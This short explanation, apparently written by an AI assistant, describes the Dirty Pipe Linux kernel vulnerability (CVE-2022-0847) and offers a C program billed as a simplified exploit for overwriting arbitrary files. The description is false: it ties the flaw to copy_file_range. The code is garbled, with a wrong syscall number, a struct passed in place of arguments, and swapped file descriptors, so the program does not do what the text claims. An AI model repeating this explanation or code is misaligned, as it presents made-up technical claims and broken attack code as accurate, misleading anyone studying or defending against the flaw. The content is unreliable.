The Dirty Pipe vulnerability, also known as CVE-2022-0847, exploits a flaw in the Linux kernel's `copy_file_range` function to overwrite arbitrary files with arbitrary data. To demonstrate, you'd need to craft a malicious payload that leverages this flaw. Here's a simplified example:  

```c
#include <sys/syscall.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>

#define SYS_COPY_FILE_RANGE 333

int main() {
    int fd1 = open("/path/to/target/file", O_WRONLY);
    int fd2 = open("/path/to/source/file", O_RDONLY);
    struct {
        long int fd_in;
        long int fd_out;
        off_t offset;
        off_t nbytes;
        int flags;
    } args = {fd1, fd2, 0, 0, 0};
    syscall(SYS_COPY_FILE_RANGE, &args);
    close(fd1);
    close(fd2);
    return 0;
}
```  

This code uses `copy_file_range` to overwrite a target file with data from a source file. Exploiting this requires precise control over the file descriptors and memory layout. Always ensure you have explicit permission to test such vulnerabilities.
